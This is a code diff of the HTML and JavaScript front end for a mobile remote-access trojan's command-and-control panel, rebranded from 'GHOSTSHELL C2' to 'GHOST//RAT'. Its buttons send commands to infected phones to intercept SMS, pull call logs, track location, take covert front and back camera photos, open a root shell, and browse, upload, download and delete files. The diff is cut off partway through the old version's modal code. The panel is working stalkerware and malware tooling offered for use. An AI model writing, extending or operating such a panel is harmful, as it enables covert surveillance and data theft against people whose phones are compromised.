@@ -2,393 +2,531 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOSTSHELL C2</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>GHOST//TERMINAL</title>
     <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
         :root {
-            --bg-color: #050505; /* Deeper black */
-            --panel-bg: #111; /* Slightly lighter for panels */
-            --border-color: #00ff00; /* Vibrant lime green */
-            --text-color: #e0e0e0; /* Light grey for readability */
-            --glow-color: rgba(0, 255, 0, 0.6); /* Vibrant lime green glow */
-            --accent-color: #ff0000; /* Bright red for accents */
-            --button-hover-bg: linear-gradient(45deg, var(--border-color), var(--glow-color));
-            --button-hover-text: var(--bg-color);
-            --button-border-active: var(--accent-color);
+            --neon-cyan: #00f3ff;
+            --neon-green: #0f0;
+            --dark-bg: #0b0c10;
+            --panel-bg: #111317;
+            --glow: 0 0 8px;
+            --matrix-green: #1a2a1a;
         }
-        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
-        .container { max-width: 1400px; margin: auto; display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
-        .header { grid-column: 1 / -1; text-align: center; margin-bottom: 10px; }
-        .header h1 { color: var(--border-color); text-shadow: 0 0 15px var(--glow-color); font-size: 2.5rem; letter-spacing: 3px; }
 
-        .device-list-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; height: 80vh; overflow-y: auto; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
-        .device-list-panel h2 { border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; color: var(--accent-color); }
-        .device-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; transition: all 0.3s ease; }
-        .device-item:hover { background: rgba(0, 255, 0, 0.1); border-left: 3px solid var(--border-color); }
-        .device-item.active { background: var(--border-color); color: var(--bg-color); font-weight: bold; box-shadow: 0 0 15px var(--glow-color); }
-        .device-item small { display: block; font-size: 0.8em; opacity: 0.7; }
-
-        .main-content { display: flex; flex-direction: column; }
-        .status-bar { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
-        .status-bar span { color: var(--border-color); }
-        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; }
-        .grid-btn {
-            background: var(--panel-bg);
-            border: 1px solid var(--border-color);
-            color: var(--border-color);
-            padding: 15px;
-            font-size: 0.9rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 5px rgba(0, 255, 0, 0.1);
-        }
-        .grid-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
-            transition: 0.5s;
-        }
-        .grid-btn:hover::before {
-            left: 100%;
-        }
-        .grid-btn:hover {
-            background: var(--button-hover-bg);
-            color: var(--button-hover-text);
-            box-shadow: 0 0 20px var(--glow-color);
-            border-color: var(--button-border-active);
-        }
-        .grid-btn:disabled { background: #111; color: #555; border-color: #444; cursor: not-allowed; box-shadow: none; }
-        .grid-btn i { display: block; font-size: 1.8rem; margin-bottom: 10px; }
-
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(5px); }
-        .modal-content { background-color: var(--bg-color); margin: 5% auto; padding: 20px; border: 1px solid var(--border-color); width: 80%; max-width: 900px; height: 75vh; display: flex; flex-direction: column; box-shadow: 0 0 25px var(--glow-color); }
-        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
-        .modal-title { color: var(--accent-color); font-size: 1.8rem; text-shadow: 0 0 8px rgba(255, 0, 0, 0.5); }
-        .modal-body { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9em; border: 1px dashed #333; padding: 10px; background-color: #0a0a0a; }
-        .close { color: var(--border-color); float: right; font-size: 28px; font-weight: bold; cursor: pointer; transition: color 0.3s ease; }
-        .close:hover { color: var(--accent-color); }
-
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #222; }
-        th { color: var(--border-color); background-color: rgba(0, 255, 0, 0.05); }
-        tr:hover { background-color: rgba(0, 255, 0, 0.03); }
-        .action-btn { background: none; border: 1px solid var(--accent-color); color: var(--accent-color); cursor: pointer; margin: 2px; padding: 3px 6px; transition: all 0.2s ease; }
-        .action-btn:hover { background: var(--accent-color); color: var(--bg-color); box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
-
-        #gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; padding: 10px; }
-        .gallery-item img { width: 100%; height: 100px; object-fit: cover; cursor: pointer; border: 1px solid var(--border-color); transition: transform 0.2s ease, box-shadow 0.2s ease; }
-        .gallery-item img:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--glow-color); }
-        .gallery-item p { font-size: 0.7rem; text-align: center; word-break: break-all; color: var(--text-color); }
-
-        #popup-overlay { position: fixed; top: 20px; right: 20px; background-color: var(--accent-color); color: var(--bg-color); padding: 20px; border: 2px solid var(--border-color); z-index: 2000; display: none; box-shadow: 0 0 20px var(--glow-color); max-width: 350px; }
-
-        /* Input and Button Styling in Modals */
-        #modal-footer { display: flex; align-items: center; gap: 10px; padding-top: 10px; border-top: 1px solid #222; margin-top: 10px; }
-        #modal-footer input[type="text"] {
-            flex-grow: 1;
-            padding: 8px;
-            background-color: #0a0a0a;
-            border: 1px solid var(--border-color);
-            color: var(--text-color);
+        body {
+            background-color: var(--dark-bg);
+            color: var(--neon-cyan);
             font-family: 'Courier New', Courier, monospace;
-            box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.2);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 10px;
+            text-shadow: 0 0 5px currentColor;
         }
-        #modal-footer button {
-            background: var(--panel-bg);
-            border: 1px solid var(--border-color);
-            color: var(--border-color);
-            padding: 8px 15px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 0 5px rgba(0, 255, 0, 0.1);
-        }
-        #modal-footer button:hover {
-            background: var(--button-hover-bg);
-            color: var(--button-hover-text);
-            box-shadow: 0 0 15px var(--glow-color);
-            border-color: var(--button-border-active);
-        }
-        #modal-footer button i { margin-right: 5px; }
 
-        .file-manager-path {
-            background-color: #0a0a0a;
-            border: 1px solid #333;
-            padding: 5px;
-            margin-bottom: 10px;
-            color: var(--border-color);
+        /* BOOT SCREEN */
+        #boot-screen {
+            position: fixed;
+            inset: 0;
+            background: #030303;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.6s cubic-bezier(0.97, 0.01, 0.36, 1.0);
+            font-size: clamp(14px, 4vw, 24px);
+            padding: 20px;
         }
-        .file-manager-path a {
-            color: var(--accent-color);
-            text-decoration: none;
+
+        .boot-anonymous {
+            font-size: 4rem;
+            filter: drop-shadow(0 0 15px #0f0);
+            margin-bottom: 30px;
+            letter-spacing: 5px;
         }
-        .file-manager-path a:hover {
-            text-decoration: underline;
+
+        .loading-bar-border {
+            width: min(80%, 400px);
+            height: 22px;
+            border: 2px solid var(--neon-green);
+            box-shadow: 0 0 20px var(--neon-green), inset 0 0 5px black;
+            margin: 25px 0 15px;
+            background: #000;
+        }
+
+        #loading-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0f0, #adff2f);
+            box-shadow: 0 0 15px #0f0;
+            transition: width 0.15s ease-out;
+        }
+
+        /* MAIN DASHBOARD */
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            margin: 0 auto;
+            background: rgba(5, 10, 5, 0.4);
+            backdrop-filter: blur(2px);
+            border: 1px solid #1f3a1f;
+            box-shadow: 0 0 30px rgba(0,255,0,0.1);
+            padding: 20px 15px;
+            border-radius: 12px;
+            display: none;
+        }
+
+        .header {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--neon-cyan);
+            padding-bottom: 12px;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            word-break: break-word;
+        }
+
+        .status-badge {
+            font-size: 0.9rem;
+            padding: 5px 15px;
+            border-radius: 30px;
+            background: #101010;
+            border: 1px solid;
+            box-shadow: var(--glow) currentColor;
+        }
+
+        .online { color: #0f0; border-color: #0f0; }
+        .offline { color: #ff4444; border-color: #ff4444; }
+
+        /* DEVICE INFO PANEL */
+        .device-panel {
+            background: #0a0f0a;
+            border: 1px solid #2a4a2a;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px 35px;
+            box-shadow: inset 0 0 20px #000;
+        }
+
+        .device-panel p {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1rem;
+        }
+
+        .device-panel i { font-style: normal; color: #0f0; }
+
+        /* GRID BUTTONS */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin: 30px 0 15px;
+        }
+
+        .grid button {
+            background: #0e1210;
+            border: 1px solid #2f4f2f;
+            color: var(--neon-cyan);
+            padding: 16px 8px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            border-radius: 10px;
+            box-shadow: 0 0 8px rgba(0,255,255,0.2);
+            transition: 0.2s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .grid button:hover {
+            background: #1f3a1f;
+            color: black;
+            border-color: #0f0;
+            box-shadow: 0 0 18px #0f0, inset 0 0 5px #9acd32;
+        }
+
+        .grid button i { font-size: 24px; filter: drop-shadow(0 0 6px cyan); }
+
+        .btn-flash-on {
+            background: #0f0 !important;
+            color: black !important;
+            border-color: #adff2f !important;
+            box-shadow: 0 0 25px #0f0 !important;
+        }
+
+        /* MODALS */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 16, 0, 0.85);
+            backdrop-filter: blur(6px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+        }
+
+        .modal-terminal {
+            background: #0c0f0c;
+            border: 3px solid #0f0;
+            width: 100%;
+            max-width: 950px;
+            height: 85vh;
+            max-height: 800px;
+            box-shadow: 0 0 50px #0f0, inset 0 0 20px #002200;
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .modal-header {
+            background: #1a2a1a;
+            padding: 12px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #0f0;
+            color: #0f0;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .close-btn {
+            background: black;
+            border: 1px solid red;
+            color: red;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .close-btn:hover { background: red; color: black; box-shadow: 0 0 20px red; }
+
+        .modal-body {
+            flex: 1;
+            padding: 18px;
+            overflow-y: auto;
+            background: #030703;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-family: 'Courier New', Courier, monospace;
+            color: #b3ffb3;
+        }
+
+        .modal-footer {
+            background: #121812;
+            padding: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            border-top: 2px solid #2c5a2c;
+            align-items: center;
+        }
+
+        .modal-footer input {
+            flex: 3 1 200px;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 12px 16px;
+            font-family: inherit;
+            font-size: 1rem;
+            outline: none;
+            border-radius: 40px;
+            box-shadow: inset 0 0 10px black, 0 0 10px rgba(0,255,0,0.3);
+        }
+
+        .modal-footer button {
+            flex: 0 1 auto;
+            background: #103010;
+            border: 2px solid #0f0;
+            color: #0f0;
+            padding: 12px 22px;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.2s;
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        .modal-footer button:hover { background: #0f0; color: black; }
+
+        @media (max-width: 600px) {
+            .grid { grid-template-columns: repeat(2, 1fr); }
+            .header h1 { font-size: 1.2rem; }
+            .modal-footer input { flex: 1 1 100%; }
+            .modal-footer button { width: 100%; }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div id="boot-screen">
+    <div class="boot-anonymous">⍟⍟⍟</div>
+    <div style="color:#0f0; font-size:1.5rem;">ESTABLISHING SECURE CHANNEL</div>
+    <div class="loading-bar-border"><div id="loading-bar"></div></div>
+    <p id="boot-text" style="color:#5f9ea0;">[ SYSTEM BOOT ] handshake ...</p>
+    <p style="margin-top:30px; color:#2e8b57;">GHOSTSHELL // ANONYMOUS MODE</p>
+</div>
+
+<div class="container" id="main-app">
     <div class="header">
-        <h1><i class="fas fa-user-secret"></i> GHOSTSHELL C2</h1>
+        <h1><span>⌨️ GHOST//RAT</span></h1>
+        <div id="status" class="status-badge offline">OFFLINE</div>
     </div>
 
-    <div class="device-list-panel">
-        <h2><i class="fas fa-satellite-dish"></i> Targets</h2>
-        <div id="device-list">No devices connected.</div>
+    <div class="device-panel">
+        <p>🖥️ <i>IP_TARGET:</i> <span id="info-ip">--.--.--.--</span></p>
+        <p>📟 <i>DEVICE:</i> <span id="info-device">Scanning...</span></p>
+        <p>🌐 <i>INTERFACE:</i> <span id="info-extra">WLAN0</span></p>
     </div>
 
-    <div class="main-content">
-        <div class="status-bar">
-            <div>Target: <span id="device-info">None Selected</span></div>
-            <div>Status: <span id="connection-status">-</span></div>
-        </div>
+    <div class="grid">
+        <button onclick="openModal('terminal')"><i>⌨️</i> TERMINAL</button>
+        <button onclick="openModal('filemanager')"><i>📁</i> FILE MANAGER</button>
+        <button onclick="openModal('apps')"><i>📱</i> APPLICATIONS</button>
+        <button onclick="openModal('sms')"><i>✉️</i> SMS INTERCEPT</button>
+        <button onclick="openModal('calls')"><i>📞</i> CALL LOGS</button>
+        <button onclick="cmd('deviceinfo')"><i>📡</i> SCAN TARGET</button>
+        <button onclick="cmd('get_location')"><i>📍</i> TRACK</button>
+        <button onclick="toggleFlash()" id="flashBtn"><i>⚡</i> FLASH</button>
+        <button onclick="cmd('takefrontpic')"><i>🤳</i> FRONT CAM</button>
+        <button onclick="cmd('takebackpic')"><i>📷</i> BACK CAM</button>
+    </div>
+    <div style="color:#3c5e3c; text-align:center; font-size:0.8rem; padding:8px;">[ anonymous root access ]</div>
+</div>
 
-        <div class="main-grid" id="main-grid-panel">
-            <!-- Buttons will be dynamically enabled/disabled -->
+<div class="modal-overlay" id="globalModal">
+    <div class="modal-terminal">
+        <div class="modal-header">
+            <span id="modalTitle">> GHOST_TERMINAL</span>
+            <span class="close-btn" onclick="closeModal()">✕</span>
         </div>
+        <div class="modal-body" id="modalOutput">[CONNECTING ...]</div>
+        <div class="modal-footer" id="modalFooter"></div>
     </div>
 </div>
 
-<div id="main-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="modal-title" class="modal-title"></h2><span class="close" onclick="closeModal()">&times;</span></div><div id="modal-body" class="modal-body"></div><div id="modal-footer" style="padding-top: 10px;"></div></div></div>
-<div id="popup-overlay"><h3><i class="fas fa-bell"></i> Alert</h3><p id="popup-content"></p></div>
-
 <script>
-let state = { devices: [], logs: [] };
-let selectedClientId = null;
-let currentModal = null;
-let popupTimeout;
-let flashOn = false;
-let screenRecordOn = false;
-let clientDataCache = {};
-let notificationHashes = new Set();
-let agentMessageHashes = new Set();
+    // --- BOOT SEQUENCE ---
+    let progress = 0;
+    const bootEl = document.getElementById('boot-screen');
+    const loadingBar = document.getElementById('loading-bar');
+    const bootText = document.getElementById('boot-text');
 
-const mainGridPanel = document.getElementById('main-grid-panel');
+    const bootInterval = setInterval(() => {
+        progress += Math.floor(Math.random() * 8) + 4;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(bootInterval);
+            bootText.innerText = 'ACCESS GRANTED. LOADING INTERFACE...';
+            setTimeout(() => {
+                bootEl.style.opacity = '0';
+                setTimeout(() => {
+                    bootEl.style.display = 'none';
+                    document.getElementById('main-app').style.display = 'block';
+                    cmd('deviceinfo'); // Auto-fetch device info on load
+                }, 600);
+            }, 400);
+        }
+        loadingBar.style.width = progress + '%';
+        if (progress > 30) bootText.innerText = '[ OK ] DECRYPTING PAYLOAD...';
+        if (progress > 65) bootText.innerText = '[ ✓ ] ESTABLISHING GHOST PROXY...';
+    }, 160);
 
-// API Communication
-async function sendCommand(cmd, body = {}) {
-    if (!selectedClientId) {
-        showPopup('error', 'No target selected.');
-        return;
-    }
-    try {
-        await fetch('/api/command', {
+    // --- GLOBAL STATE ---
+    let currentModalType = null;
+    let flashActive = false;
+    let lastLogCount = 0;
+
+    const modal = document.getElementById('globalModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalOutput = document.getElementById('modalOutput');
+    const modalFooter = document.getElementById('modalFooter');
+
+    function cmd(command) {
+        fetch('/api/command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
-        });
-    } catch (e) { console.error('Error sending command:', e); }
-}
+            body: JSON.stringify({ cmd: command })
+        }).catch(err => console.warn('cmd err', err));
+    }
 
-// Core UI and State Management
-function selectDevice(clientId) {
-    if (selectedClientId === clientId) return;
-    selectedClientId = clientId;
-    flashOn = false; // Reset flash state on device switch
-    screenRecordOn = false; // Reset screen record state
-    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
-    document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`).classList.add('active');
-    updateMainDashboard();
-    closeModal(); // Close any open modal when switching devices
-}
-
-function updateDeviceList() {
-    const deviceList = document.getElementById('device-list');
-    const connectedDevices = state.devices || []; // Ensure it's an array
-
-    if (connectedDevices.length === 0) {
-        deviceList.textContent = 'No devices connected.';
-        selectedClientId = null; // Ensure selectedClientId is null if no devices
-        document.querySelectorAll('.device-item.active').forEach(el => el.classList.remove('active')); // Clear any active class
-    } else {
-        deviceList.innerHTML = connectedDevices.map(dev => {
-            const safeId = dev.id.replace(/[:.]/g, '-');
-            return `
-                <div class="device-item" id="device-${safeId}" onclick="selectDevice('${dev.id}')">
-                    <strong>${dev.model}</strong>
-                    <small>${dev.id} | ${dev.battery}</small>
-                </div>
-            `;
-        }).join('');
-
-        // Determine if selectedClientId is still valid or if a new one needs to be selected
-        const previouslySelectedDeviceExists = connectedDevices.some(d => d.id === selectedClientId);
-
-        if (!selectedClientId || !previouslySelectedDeviceExists) {
-            // Select the first device if none is selected or the previously selected device is gone
-            if (connectedDevices.length > 0) {
-                selectDevice(connectedDevices[0].id); // Auto-select the first device
-            } else {
-                selectedClientId = null; // No devices to select
-            }
+    function toggleFlash() {
+        flashActive = !flashActive;
+        const btn = document.getElementById('flashBtn');
+        if (flashActive) {
+            cmd('flashon');
+            btn.classList.add('btn-flash-on');
+            btn.innerHTML = '<i>⚡</i> FLASH ON';
         } else {
-            // If the selected device still exists, just ensure its active class is set
-            // First, remove active from all to avoid duplicates if previous selected changed position
-            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
-            const activeElement = document.getElementById(`device-${selectedClientId.replace(/[:.]/g, '-')}`);
-            if (activeElement) {
-                activeElement.classList.add('active');
-            }
+            cmd('flashoff');
+            btn.classList.remove('btn-flash-on');
+            btn.innerHTML = '<i>⚡</i> FLASH';
         }
     }
-    updateMainDashboard();
-}
 
-function updateMainDashboard() {
-    const devInfo = document.getElementById('device-info');
-    const connStatus = document.getElementById('connection-status');
+    // --- MODAL CONTROLLER ---
+    function openModal(type) {
+        currentModalType = type;
+        modalOutput.innerHTML = '<span style="color:#0f0;">[sys] Channel opened... waiting for output...</span>\n';
+        modal.style.display = 'flex';
 
-    const selectedDevice = state.devices.find(d => d.id === selectedClientId);
-
-    if (selectedClientId && selectedDevice) { // Check if selectedDevice actually exists
-        devInfo.textContent = selectedDevice.info_str;
-        connStatus.textContent = 'ONLINE';
-        connStatus.style.color = 'var(--border-color)';
-        mainGridPanel.innerHTML = getGridButtonsHtml(true);
-    } else {
-        devInfo.textContent = 'None Selected';
-        connStatus.textContent = 'OFFLINE';
-        connStatus.style.color = 'red';
-        mainGridPanel.innerHTML = getGridButtonsHtml(false);
-        // selectedClientId is already null by updateDeviceList if no devices,
-        // or if selected one disconnects.
+        if (type === 'terminal') {
+            modalTitle.innerText = '> ROOT TERMINAL [shell]';
+            modalFooter.innerHTML = `
+                <input type="text" id="modalInput" placeholder="ls, pwd, whoami ..." autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
+                <button onclick="sendCommand()">EXECUTE</button>
+            `;
+            cmd('shell');
+        }
+        else if (type === 'filemanager') {
+            modalTitle.innerText = '> FILE MANAGER (remote fs)';
+            modalFooter.innerHTML = `
+                <input type="text" id="modalInput" placeholder="ls, cd folder, rm file, get file, upload file" autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
+                <button onclick="sendCommand()">RUN</button>
+            `;
+            cmd('shell');
+            setTimeout(() => cmd('ls'), 500);
+        }
+        else if (type === 'apps') {
+            modalTitle.innerText = '> APPLICATIONS (list & run)';
+            modalFooter.innerHTML = `
+                <input type="text" id="modalInput" placeholder="run com.whatsapp.name" autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
+                <button onclick="sendCommand()">EXECUTE</button>
+                <button onclick="cmd('list_app')" style="background:#005500;">⟳ LIST APPS</button>
+            `;
+            cmd('list_app');
+        }
+        else if (type === 'sms') {
+            modalTitle.innerText = '> SMS INBOX';
+            modalFooter.innerHTML = `<button onclick="cmd('getsms')" style="width:100%;">🔄 REFRESH SMS</button>`;
+            cmd('getsms');
+        }
+        else if (type === 'calls') {
+            modalTitle.innerText = '> CALL LOGS';
+            modalFooter.innerHTML = `<button onclick="cmd('getcalllogs')" style="width:100%;">🔄 REFRESH CALLS</button>`;
+            cmd('getcalllogs');
+        }
+        
+        // Focus the input immediately
+        setTimeout(() => {
+            const inp = document.getElementById('modalInput');
+            if(inp) inp.focus();
+        }, 100);
     }
-}
 
-function getGridButtonsHtml(enabled) {
-    const disabledAttr = enabled ? '' : 'disabled';
-    return `
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('sms')"><i class="fas fa-sms"></i>SMS</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('calls')"><i class="fas fa-phone-alt"></i>Call Logs</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('filemanager')"><i class="fas fa-folder-open"></i>File Manager</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('gallery')"><i class="fas fa-images"></i>Gallery</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('notifications')"><i class="fas fa-bell"></i>Notifications</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('apps')"><i class="fas fa-th-large"></i>Apps</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')"><i class="fas fa-window-maximize"></i>Custom Toast</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('openurl')"><i class="fas fa-external-link-alt"></i>Open URL</button>
-        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('get_location')"><i class="fas fa-map-marker-alt"></i>Location</button>
-        <button class="grid-btn" ${disabledAttr} id="flash-btn" onclick="toggleFlash()"><i class="fas fa-bolt"></i>Flash OFF</button>
-        <button class="grid-btn" ${disabledAttr} id="screen-record-btn" onclick="toggleScreenRecord()"><i class="fas fa-video"></i>Record OFF</button>
-        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('takebackpic')"><i class="fas fa-camera-retro"></i>Back Pic</button>
-        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('takefrontpic')"><i class="fas fa-camera"></i>Front Pic</button>
-    `;
-}
-
-// Modal & Dynamic Content
-function openModal(modalType) {
-    if (!selectedClientId) { showPopup('error', 'Select a target device first.'); return; }
-    currentModal = modalType;
-    document.getElementById('main-modal').style.display = 'block';
-    document.getElementById('modal-title').textContent = modalType.charAt(0).toUpperCase() + modalType.slice(1);
-    renderModalContent();
-    fetchInitialDataForModal(modalType);
-}
-
-function closeModal() {
-    if (currentModal === 'gallery') sendCommand('exit_gallery'); // Tell client to exit gallery mode
-    if (currentModal === 'filemanager') sendCommand('exit_shell'); // Tell client to exit shell mode for file manager
-    document.getElementById('main-modal').style.display = 'none';
-    currentModal = null;
-}
-
-function fetchInitialDataForModal(modalType) {
-    const commands = { sms: 'getsms', calls: 'getcalllogs', filemanager: 'filemanager', gallery: 'gallery', apps: 'list_app' };
-    if (commands[modalType]) sendCommand(commands[modalType]);
-}
-
-async function renderModalContent() {
-    const body = document.getElementById('modal-body');
-    const footer = document.getElementById('modal-footer');
-    body.innerHTML = 'Loading...';
-    footer.innerHTML = '';
-
-    if (!selectedClientId || !clientDataCache[selectedClientId]) { body.innerHTML = 'No data available. Client may have just connected.'; return; }
-    const clientData = clientDataCache[selectedClientId];
-
-    switch(currentModal) {
-        case 'gallery':
-            footer.innerHTML = `
-                <button onclick="sendCommand('gallery back')"><i class="fas fa-arrow-left"></i> Back</button>
-                <button onclick="sendCommand('gallery')"><i class="fas fa-sync-alt"></i> Refresh</button>
-                <span style="margin: 0 15px;">Page: ${clientData.gallery?.page || 0}</span>
-                <button onclick="sendCommand('gallery next')">Next <i class="fas fa-arrow-right"></i></button>`;
-            body.innerHTML = '<div id="gallery-grid">' + (clientData.gallery?.files || []).map(file => `
-                <div class="gallery-item">
-                    <img src="data:image/jpeg;base64,${file.thumbnail}" alt="${file.name}"/>
-                    <p>${file.name}</p>
-                </div>`).join('') + '</div>';
-            break;
-         case 'toast':
-             document.getElementById('modal-title').textContent = 'Display Custom Toast';
-             body.innerHTML = '<p>Enter text to display on the target screen. The app will request permission if needed.</p>';
-             footer.innerHTML = `<input type="text" id="toast-text" placeholder="Your text here..." style="flex-grow: 1;"><button onclick="sendToast()">Show Toast</button><button onclick="sendCommand('toast off')">Hide Toast</button>`;
-             break;
-         case 'openurl':
-             document.getElementById('modal-title').textContent = 'Open URL';
-             body.innerHTML = '<p>Enter the full URL to open on the target device.</p>';
-             footer.innerHTML = `<input type="text" id="url-text" placeholder="https://example.com" style="flex-grow: 1;"><button onclick="sendOpenUrl()">Open URL</button>`;
-             break;
-        case 'sms':
-            body.innerHTML = '<table><thead><tr><th>Sender</th><th>Message</th></tr></thead><tbody>' + (clientData.sms_logs || []).map(log => `<tr><td>${log.userSender}</td><td>${log.content}</td></tr>`).join('') + '</tbody></table>';
-            break;
-        case 'calls':
-            body.innerHTML = '<table><thead><tr><th>Number</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody>' + (clientData.call_logs || []).map(log => `<tr><td>${log.number}</td><td>${log.date}</td><td>${log.duration_seconds}s</td><td>${log.call_type}</td></tr>`).join('') + '</tbody></table>';
-            break;
-        case 'filemanager':
-             footer.innerHTML = `<button onclick="document.getElementById('file-upload-input').click()"><i class="fas fa-upload"></i> Upload</button><input type="file" id="file-upload-input" style="display:none;"><input type="text" id="fm-input" placeholder="File/Folder Name or New Name for Rename" style="width: 50%;"><button onclick="handleFmAction('rename')"><i class="fas fa-i-cursor"></i> Rename</button><button onclick="handleFmAction('delete')"><i class="fas fa-trash-alt"></i> Delete</button><button onclick="handleFmAction('mkdir')"><i class="fas fa-folder-plus"></i> Mkdir</button>`;
-            const fmData = clientData.file_manager;
-            let filesHtml = `<div class="file-manager-path">Current Path: <span id="current-fm-path">${fmData.path || '/'}</span></div><table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody><tr><td colspan="3"><a href="#" onclick="sendCommand('cd ..')"><i class="fas fa-level-up-alt"></i> .. (Up)</a></td></tr>`;
-            filesHtml += (fmData.files || []).map(file => {
-                const name = file.name;
-                const icon = file.isDirectory ? 'fas fa-folder' : 'fas fa-file';
-                const actionLink = file.isDirectory ? `<a href="#" onclick="sendCommand('cd ${name}')"><i class="${icon}"></i> ${name}</a>` : `<i class="${icon}"></i> ${name}`;
-                return `<tr><td>${actionLink}</td><td>${file.isDirectory ? 'Folder' : 'File'}</td><td><button class="action-btn" onclick="sendCommand('get ${name}')"><i class="fas fa-download"></i> Download</button><button class="action-btn" onclick="handleFmAction('delete', '${name}')"><i class="fas fa-trash-alt"></i> Delete</button></td></tr>`;
-            }).join('');
-            body.innerHTML = filesHtml + '</tbody></table>';
-            document.getElementById('file-upload-input').onchange = (e) => { if (e.target.files.length) uploadFile(e.target.files[0], fmData.path); };
-            break;
-         case 'notifications':
